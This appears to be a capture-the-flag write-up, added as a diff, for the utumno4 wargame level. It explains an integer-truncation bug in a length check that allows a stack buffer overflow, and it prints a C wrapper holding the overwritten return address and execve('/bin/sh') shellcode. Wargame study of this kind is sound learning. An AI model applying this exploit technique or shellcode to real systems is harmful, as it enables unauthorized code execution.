@@ -1,0 +1,71 @@
+Quick level, not as complex as utumno 3.
+Required a small little observation for how it worked, and then just a bit of trial and error for the solve!
+
+		utumno4->main (decompiled, edited)
+	┌─────────────────────────────────────────────┐
+	│size_t num_bytes_to_write = atoi(argv[1])    │
+	│if (bytes_to_write u<= 63){                  │
+	│    void buf                                 │
+	│    memcpy(&buf, argv[8], num_bytes_to_write)│
+	│    return 0                                 │
+	│}                                            │
+	│exit(1)                                      │
+	└─────────────────────────────────────────────┘
+
+Looking at this segment, it's quite brief. We pass 2 arguments
+to utumno 4, at which point it writes a number of the second argument's bytes to a location in memory.
+The number of bytes it writes is determined by converting the first argument from a number as a char
+to an actual int, using the libc function atoi.
+
+Since the variable 'buf' is in the stack above the return address, using memcpy it would definitely be 
+possible to overwrite the return address -- however, 0x3f or 63 bytes isn't even close to enough to completely overwrite ret.
+
+While contemplating this, I decided to check the disassembly and noticed something a bit off:
+
+	    utumno4.c->main+11 to main+14
+	┌────────────────────────────────────┐
+	│mov     eax, dword [ebp-0x4 {var_8}]│
+	│mov     word [ebp-0x6 {var_a}], ax  │
+	│cmp     word [ebp-0x6 {var_a}], 0x3f│
+	│jbe     0x804847d                   │
+	└────────────────────────────────────┘
+
+
+This little segment up above is where the check for 'num_bytes_to_write' is performed.
+Notice that only 'ax' is checked, or the lower 16 bytes for argv[1] as a number.
+memcpy also uses all 32 bits, but as an unsigned integer -- since you can't write a 'negative' number of bytes.
+
+With this in mind, I decided to test a number higher than 63...
+
+0x00010000, for example. With this number, the lower 16 bytes will contain '0000', and test as 0.
+Memcpy, however, will use it's full value, 0x10000 or '65536'.
+
+Running utumno4 with the string '65536' as the first value successfully passes the check!
+Of course, since argument 2 doesn't (at this point) contain that many bytes, it fails.
+
+Next up is identifying where exactly the return address is, after all 65536 bytes are written.
+
+With some trial and error, I found the position 65,328 characters in to be the position that would overwrite the return address. I used gdb to determine what the next address after that position in the stack would be, replaced the return address with that location, and then replaced the following characters after with execve(/bin/sh) shellcode!.
+
+Executing this grants a shell, and allows us to execute commands as utumno5! Woo!
+
+The payload, shortened:
+
+
+				   u4wrapper.c
+	┌─────────────────────────────────────────────────────────────────┐
+	│#include <unistd.h>                                              │  
+	│                                                                 │ 
+	│int main(void) {                                                 │  
+	│       char *environment[2] = {"SHELLCODE=", 0};                 │ 
+	│                                                                 │ 
+	│       char *argv[4] = {"./utumno4", "65536", "CCCCCC....CCCC"   │
+	│       	"\x60\xd6\xfe\xff CCCCCCCCCCB\x50\xd4\xff\xff\x31 │
+	│       	\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50  │
+	│       	\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c  │
+	│       	\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b  │
+	│       	\xcd\x80 B.....BBBB", 0};                         │
+	│       execve("./utumno4", argv, environment);                   │
+	│}                                                                │
+	│                                                                 │
+	└─────────────────────────────────────────────────────────────────┘
